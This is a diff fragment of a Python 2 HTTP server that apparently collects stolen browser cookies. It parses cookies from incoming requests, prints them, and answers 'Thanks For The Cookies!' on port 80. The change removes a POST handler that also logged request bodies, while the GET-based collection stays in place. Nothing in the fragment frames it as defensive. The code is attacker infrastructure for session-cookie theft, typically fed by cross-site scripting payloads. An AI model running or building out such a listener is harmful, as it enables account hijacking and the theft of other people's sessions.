@@ -26,16 +26,6 @@ class S(BaseHTTPRequestHandler):
             printCookies(params)
         self.wfile.write("<html><body><h1>Thanks For The Cookies!</h1></body></html>") #Response - not really necessary
 
-    #POST Handler
-    def do_POST(self):
-        self._set_headers()
-        #Grab cookies in the same way as the GET Handler
-        parsedUrl = urlparse.urlparse(self.path)
-        params = urlparse.parse_qs(parsedUrl.query)
-        if(params):
-            printCookies(params)
-        print self.rfile.read(int(self.headers.getheader('Content-Length')))
-        self.wfile.write("<html><body><h1>Thanks For The Cookies!</h1></body></html>") #Response - not necessary
 
 #Runs the servers      
 def run(server_class=HTTPServer, handler_class=S, port=80):
